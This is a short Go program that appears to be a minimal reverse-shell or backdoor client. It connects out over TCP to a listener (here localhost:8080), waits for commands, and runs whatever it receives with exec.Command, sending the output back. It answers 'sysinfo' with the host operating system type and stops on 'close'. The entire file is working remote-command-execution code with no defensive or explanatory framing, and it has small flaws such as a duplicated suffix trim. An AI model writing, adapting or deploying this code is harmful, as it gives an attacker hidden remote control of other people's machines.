package main

import (
	"bufio"
	"strings"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
)


func main() {

	conn, err := net.Dial("tcp", "localhost:8080")

	if err != nil {
		log.Fatal("Connection failled with", err)
	}

	for {

		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSuffix(cmd, "\n")
		cmd = strings.TrimSuffix(cmd, "\n")

		if strings.Compare(cmd, "close") == 0 {
			break
		}

		if strings.Compare(cmd, "sysinfo") == 0 {
			var osType string
			if runtime.GOOS == "windows" {
				osType = "windows"
			} else {
				osType = "unix"
			}
			fmt.Fprintf(conn, osType)

		} else {
			out, err := exec.Command(cmd).Output()
		
			if err != nil {
				fmt.Println("", err)
			}

			output := string(out[:])
			fmt.Fprintf(conn, output)
		}
	}
	conn.Close()
}
